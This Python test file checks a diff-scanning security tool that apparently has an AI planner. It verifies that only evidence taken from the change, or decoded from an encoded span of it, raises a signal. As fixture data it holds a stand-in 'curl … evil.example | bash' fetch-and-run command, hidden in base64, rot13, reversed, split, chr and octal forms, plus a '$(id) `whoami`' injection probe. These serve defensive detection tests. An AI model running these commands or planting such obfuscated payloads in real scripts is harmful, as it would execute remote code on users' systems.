"""Grounding of the planner's scans: a region taken from the change (or decoded from an encoded span of it) is
evidence; text the planner wrote itself is kept but never reaches the signal floor.

A live run raised a benign change to a signal because the planner scanned a test string it composed
(`$(id) \\`whoami\\` ${IFS}`) and that hit joined the evidence union."""

from __future__ import annotations

import base64

import pytest

from diff_sentry.assemble import assemble_verdict
from diff_sentry.response import build_failed_response
from diff_sentry.schema import ChangeVerdict

_PAYLOAD = "curl -sSfL https://evil.example/x | bash"
_B64 = base64.b64encode(_PAYLOAD.encode()).decode()

EVENT = {
    "repo": "acme/app", "kind": "pull_request", "number": 9, "author": "dev", "title": "Tidy the build script",
    "body": "Small cleanup.",
    "files": [{"filename": "scripts/build.sh", "status": "modified", "additions": 2, "deletions": 0,
               "patch": f"@@ -1,2 +1,4 @@\n #!/bin/sh\n+echo {_B64} | base64 -d >/dev/null\n+make all\n"}],
}


@pytest.fixture
def recorded(monkeypatch):
    """The tool's recorded calls, captured instead of written to a trace."""
    from rlm_harness import trace

    calls: list[dict] = []
    monkeypatch.setattr(trace, "record_tool_call", lambda tool, **kw: calls.append({"tool": tool, **kw}))
    return calls


def _tool(event=EVENT):
    from diff_sentry.indicators import make_indicator_tool

    return make_indicator_tool(event)


def test_a_region_copied_from_the_change_is_grounded(recorded):
    _tool()(f"+echo {_B64} | base64 -d >/dev/null")
    assert recorded[-1]["grounded"] is True
    assert all(h["grounded"] for h in recorded[-1]["hits"])


def test_text_the_planner_wrote_is_not_grounded(recorded):
    out = _tool()("$(id) `whoami` ${IFS}")
    call = recorded[-1]
    assert call["grounded"] is False and call["hits"]
    assert not any(h["grounded"] for h in call["hits"])
    assert "not evidence of the change" in out


def test_a_decoded_value_from_an_encoded_span_is_grounded(recorded):
    _tool()(_PAYLOAD, decoded_from=_B64)
    assert recorded[-1]["grounded"] is True
    assert any(h["severity"] == "critical" for h in recorded[-1]["hits"])


def test_a_decoded_value_needs_its_span_in_the_change(recorded):
    _tool()(_PAYLOAD, decoded_from=base64.b64encode(b"something else entirely").decode())
    assert recorded[-1]["grounded"] is False


# The author of the change picks the encoding; whatever the planner decodes from a span the change holds is
# evidence, or an encoding no rule recognises would keep the decoded payload below the floor.
_ENCODINGS = {
    "rot13": "phey -fFsY uggcf://rivy.rknzcyr/k | onfu",
    "reversed": "'hsab | x/elpmaxe.live//:sptth LfSs- lruc'[::-1]",
    "split": "'cur'+'l -sSfL https://ev'+'il.example/x | bash'",
    "chr": "chr(99)+chr(117)+chr(114)+chr(108)",
    "octal": "$'\\143\\165\\162\\154'",
}


@pytest.mark.parametrize("name", list(_ENCODINGS))
def test_any_encoding_the_change_holds_grounds_its_decoding(recorded, name):
    span = _ENCODINGS[name]
    event = {**EVENT, "files": [{"filename": "x.sh", "status": "added", "additions": 1, "deletions": 0,
                                 "patch": f"@@ -0,0 +1 @@\n+x={span}"}]}
    _tool(event)(_PAYLOAD, decoded_from=span)
    assert recorded[-1]["grounded"] is True


def test_a_span_split_across_patch_lines_grounds_its_join(recorded):
    event = {**EVENT, "files": [{"filename": "x.sh", "status": "added", "additions": 2, "deletions": 0,
                                 "patch": f"@@ -0,0 +1,2 @@\n+a='{_B64[:20]}\n+{_B64[20:]}'"}]}
    _tool(event)(_PAYLOAD, decoded_from=_B64)
    assert recorded[-1]["grounded"] is True


def test_a_wrong_decoded_from_does_not_unground_a_copied_region(recorded):
    _tool()("+make all", decoded_from="not in the change at all")
    assert recorded[-1]["grounded"] is True


@pytest.mark.parametrize("region", [
    "```sh\nmake all\n```",                          # fenced
    "#!/bin/sh\nmake all",                            # shebang added
    'node "x.js"',                                     # a JSON value read back with its escapes decoded
])
def test_wrappers_and_json_escapes_do_not_unground(recorded, region):
    event = {**EVENT, "files": [*EVENT["files"], {"filename": "package.json", "status": "modified", "additions": 1,
             "deletions": 0, "patch": '@@ -1 +1 @@\n+  "start": "node \\"x.js\\"",'}]}
    _tool(event)(region)
    assert recorded[-1]["grounded"] is True


def test_a_composed_tail_after_copied_lines_is_not_grounded(recorded):
    _tool()("make all\n" * 500 + "$(id) `whoami`")
    assert recorded[-1]["grounded"] is False


def test_the_task_hands_the_change_to_its_scanner(recorded, configure_dummy):
    from diff_sentry.config import DetectConfig
    from diff_sentry.detect import ClassifyChange

    cfg = DetectConfig(main_model="x", sub_model="x", interpreter="mock", classifier_model="x", enable_skills=False)
    task = ClassifyChange(config=cfg, event=EVENT)
    scan = next(t for t in task.tools if getattr(t, "__name__", "") == "scan_indicators")
    scan("$(id) `whoami` ${IFS}")
    assert recorded[-1]["grounded"] is False


def test_detect_from_event_builds_the_task_with_the_change(monkeypatch):
    import asyncio

    from diff_sentry import cli, detect
    from diff_sentry.config import DetectConfig

    seen = {}

    class Stop(Exception):
        pass

    def fake_task(*, config, extra_tools=(), event=None, **kw):
        seen["event"] = event
        raise Stop

    monkeypatch.setattr(detect, "ClassifyChange", fake_task)
    monkeypatch.setattr(detect, "setup", lambda config: config)
    with pytest.raises(Stop):
        asyncio.run(cli.detect_from_event(EVENT, DetectConfig(main_model="x", sub_model="x", classifier_model="x")))
    assert seen["event"] is EVENT


def test_lines_regrouped_or_respaced_from_the_change_are_grounded(recorded):
    _tool()(f"echo   {_B64}  | base64 -d >/dev/null\nmake all")
    assert recorded[-1]["grounded"] is True


def test_without_the_change_every_region_counts(recorded):
    from diff_sentry.indicators import make_indicator_tool

    make_indicator_tool()("$(id) `whoami` ${IFS}")
    assert recorded[-1]["grounded"] is True


# ── the read side: assemble and the no-verdict paths ───────────────────────────────────────────────

def _hit(severity="high", grounded=True, hid="ind-ci-shell-injection-aaaa0000"):
    return {"id": hid, "rule": "ci-shell-injection", "severity": severity, "title": "t", "evidence": "e",
            "grounded": grounded}


def _events(*tool_hits, baseline=()):
    events = [{"type": "run_start", "payload": {"meta": {"baseline_indicators": list(baseline),
                                                          "emit_on": ["suspicious", "malicious"]}}}]
    for hits in tool_hits:
        events.append({"type": "tool_call", "payload": {"tool": "scan_indicators", "hits": hits}})
    return events


_BENIGN = ChangeVerdict(summary="s", verdict="benign", confidence=0.9, rationale="r")


def test_an_ungrounded_high_does_not_signal():
    out = assemble_verdict(_BENIGN, _events([_hit(grounded=False)]))
    assert out.signal is False and out.floor_indicator_severity == "info"
    assert out.max_indicator_severity == "high"                   # the key keeps its one meaning: every hit
    assert [h.grounded for h in out.indicators] == [False]        # kept in the evidence, marked


def test_a_grounded_high_still_signals():
    out = assemble_verdict(_BENIGN, _events([_hit()]))
    assert out.signal is True and out.max_indicator_severity == "high"


def test_one_grounded_sighting_grounds_the_hit():
    out = assemble_verdict(_BENIGN, _events([_hit(grounded=False)], [_hit()]))
    assert out.signal is True and [h.grounded for h in out.indicators] == [True]


def test_planner_text_cannot_lift_a_softened_grounded_hit():
    # One match can be read at two severities (prose softening); the copy on planner text must not lift it.
    out = assemble_verdict(_BENIGN, _events([_hit("critical", grounded=False)], baseline=[_hit("medium")]))
    assert out.signal is False and [(h.severity, h.grounded) for h in out.indicators] == [("medium", True)]


def test_a_trace_written_before_grounding_reads_as_before():
    old = {k: v for k, v in _hit().items() if k != "grounded"}
    assert assemble_verdict(_BENIGN, _events([old])).signal is True


def test_the_baseline_always_counts():
    out = assemble_verdict(_BENIGN, _events(baseline=[{k: v for k, v in _hit().items() if k != "grounded"}]))
    assert out.signal is True


def test_the_crash_path_reads_the_same_floor():
    resp = build_failed_response("r", _events([_hit(grounded=False)]), "boom")
    assert resp.signal is False and resp.floor_indicator_severity == "info"


def test_the_siem_payload_marks_grounding_and_lists_the_change_first():
    from diff_sentry.emit import signal_payload

    resp = build_failed_response("r", _events([_hit("critical", grounded=False, hid="ind-a-1")],
                                              baseline=[_hit("medium", hid="ind-b-2")]), "boom")
    payload = signal_payload(resp)
    assert [(i["id"], i["grounded"]) for i in payload["indicators"]] == [("ind-b-2", True), ("ind-a-1", False)]
    assert payload["floor_indicator_severity"] == "medium"


def test_each_layer_of_a_multi_layer_encoding_grounds(recorded):
    # base64 of hex of the payload: the planner decodes one layer at a time and passes the previous value.
    hexed = _PAYLOAD.encode().hex()
    outer = base64.b64encode(hexed.encode()).decode()
    event = {**EVENT, "files": [{"filename": "x.sh", "status": "added", "additions": 1, "deletions": 0,
                                 "patch": f"@@ -0,0 +1 @@\n+x={outer}"}]}
    scan = _tool(event)
    scan(hexed, decoded_from=outer)
    scan(_PAYLOAD, decoded_from=hexed)
    assert [c["grounded"] for c in recorded] == [True, True]
    assert any(h["severity"] == "critical" for h in recorded[-1]["hits"])


def test_a_value_the_planner_wrote_cannot_ground_the_next_layer(recorded):
    scan = _tool()
    scan("echo made up")                                         # ungrounded, so not remembered
    scan(_PAYLOAD, decoded_from="echo made up")
    assert [c["grounded"] for c in recorded] == [False, False]


def test_a_large_region_of_line_fragments_stays_fast(recorded):
    import time

    big = "\n".join(f"line {i} with some words {i * 7}" for i in range(20_000))
    event = {**EVENT, "files": [{"filename": "big.txt", "status": "added", "additions": 20_000, "deletions": 0,
                                 "patch": "@@ -0,0 +1,20000 @@\n" + "\n".join("+" + x for x in big.split("\n"))}]}
    scan = _tool(event)
    region = "\n".join(x[3:] for x in big.split("\n")[-20_000:])  # every line cut at its start
    start = time.perf_counter()
    scan(region)
    assert time.perf_counter() - start < 5.0


def test_a_large_copied_scan_does_not_crowd_out_a_decoded_layer(recorded):
    # Padding the change and scanning it whole first must not leave the decoded layers unremembered.
    hexed = _PAYLOAD.encode().hex()
    outer = base64.b64encode(hexed.encode()).decode()
    padding = "\n".join(f"+pad line {i} " + "x" * 200 for i in range(12_000))   # past the 2 MB memory
    patch = f"@@ -0,0 +1,12001 @@\n+X='{outer}'\n{padding}"
    event = {**EVENT, "files": [{"filename": "big.sh", "status": "added", "additions": 12_001, "deletions": 0,
                                 "patch": patch}]}
    scan = _tool(event)
    scan(patch)                                    # the whole patch, copied: grounded, not remembered
    scan(hexed, decoded_from=outer)
    scan(_PAYLOAD, decoded_from=hexed)
    assert [c["grounded"] for c in recorded] == [True, True, True]


def test_a_layer_cannot_be_evicted_by_a_large_decoded_value(recorded):
    # A small compressed span that decodes huge, decoded between two layers, must not unground the last one.
    hexed = _PAYLOAD.encode().hex()
    outer = base64.b64encode(hexed.encode()).decode()
    blob = "A" * 2_500_000
    event = {**EVENT, "files": [{"filename": "x.sh", "status": "added", "additions": 2, "deletions": 0,
                                 "patch": f"@@ -0,0 +1,2 @@\n+X='{outer}'\n+Y='H4sIAAAA'"}]}
    scan = _tool(event)
    scan(hexed, decoded_from=outer)
    scan(blob, decoded_from="H4sIAAAA")             # decoded from a span the change holds: grounded, huge
    scan(_PAYLOAD, decoded_from=hexed)
    assert [c["grounded"] for c in recorded] == [True, True, True]
